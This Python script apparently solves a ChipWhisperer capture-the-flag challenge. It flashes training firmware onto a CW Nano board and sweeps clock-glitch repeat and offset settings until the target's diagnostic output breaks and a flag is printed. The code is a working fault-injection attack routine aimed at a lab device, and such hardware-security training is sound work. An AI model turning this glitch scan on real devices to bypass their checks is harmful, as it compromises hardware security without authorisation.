import chipwhisperer as cw
import time

SCOPETYPE = 'CWNANO'
PLATFORM = 'CWNANO'

try:
    if not scope.connectStatus:
        scope.con()
except NameError:
    scope = cw.scope()

try:
    if SS_VER == "SS_VER_2_1":
        target_type = cw.targets.SimpleSerial2
    elif SS_VER == "SS_VER_2_0":
        raise OSError("SS_VER_2_0 is deprecated. Use SS_VER_2_1")
    else:
        target_type = cw.targets.SimpleSerial
except:
    SS_VER="SS_VER_1_1"
    target_type = cw.targets.SimpleSerial

try:
    target = cw.target(scope, target_type)
except:
    print("INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.")
    print("INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.")
    scope = cw.scope()
    target = cw.target(scope, target_type)

if "STM" in PLATFORM or PLATFORM == "CWLITEARM" or PLATFORM == "CWNANO":
    prog = cw.programmers.STM32FProgrammer
elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
    prog = cw.programmers.XMEGAProgrammer
elif "neorv32" in PLATFORM.lower():
    prog = cw.programmers.NEORV32Programmer
elif "SAM4S" in PLATFORM or PLATFORM == "CWHUSKY":
    prog = cw.programmers.SAM4SProgrammer
else:
    prog = None

def reboot_flush():
    scope.io.nrst = False
    time.sleep(0.02)  # Reduced sleep to speed up resets
    scope.io.nrst = "high_z"
    time.sleep(0.02)
    target.flush()

fw_path = "../../../challenges/set1/criticalCalculation-CWNANO.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)

scope.io.clkout = 7.5E6

gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset"])

def perform_glitch_set(repeat_low, repeat_high, ext_low, ext_high, step, sample_size):
    gc.set_global_step(step)
    gc.set_range("repeat", repeat_low, repeat_high)
    gc.set_range("ext_offset", ext_low, ext_high)
    scope.glitch.repeat = 0

    reboot_flush()
    param_count = 0
    resets_in_row = 0
    for glitch_setting in gc.glitch_values():
        scope.glitch.repeat = glitch_setting[0]
        scope.glitch.ext_offset = glitch_setting[1]
        successes = 0
        resets = 0
        for i in range(sample_size):
            target.flush()
            scope.arm()
            target.simpleserial_write("d", bytearray([]))
            ret = scope.capture()
            val = target.simpleserial_read_witherrors('r', 26, glitch_timeout=10)
            if ret:
                gc.add("reset")
                resets += 1
                resets_in_row += 1
                if resets_in_row >= 5:
                    print(f"Too many resets at repeat={scope.glitch.repeat}, ext_offset={scope.glitch.ext_offset}, skipping rest")
                    break
                reboot_flush()
            else:
                resets_in_row = 0
                if val['valid'] is False:
                    reboot_flush()
                    gc.add("reset")
                    resets += 1
                    resets_in_row += 1
                else:
                    response_str = val['payload'].decode('ascii', errors='ignore')
                    if "DIAGNOSTIC_OK" not in response_str:
                        gc.add("success")
                        print("FLAG FOUND:", response_str)
                        print(val)
                        print("Glitch settings: repeat={}, ext_offset={}".format(scope.glitch.repeat, scope.glitch.ext_offset))
                        return True, (scope.glitch.repeat, scope.glitch.ext_offset)
                    else:
                        gc.add("normal")
        param_count += 1
        if param_count % 10 == 0:
            print(f"Tested {param_count} glitch settings so far...")
    return False, None

def adaptive_glitch_scan():
    # Reduced coarse scan range and sample size for speedup
    print("Coarse scan starting with reduced range and sample size.")
    found_flag, found_params = perform_glitch_set(1, 10, 1, 200, step=5, sample_size=3)
    if found_flag:
        return found_params

    print("Coarse scan done, performing focused fine scan...")
    found_flag, found_params = perform_glitch_set(5, 15, 100, 150, step=1, sample_size=10)
    if found_flag:
        return found_params

    print("Flag not found.")
    return None

flag_params = adaptive_glitch_scan()
if flag_params:
    print("Flag found at glitch parameters:", flag_params)
else:
    print("Flag not found.")

gc.glitch_plot(plotdots={"success": "+g", "reset": "xr", "normal": None})
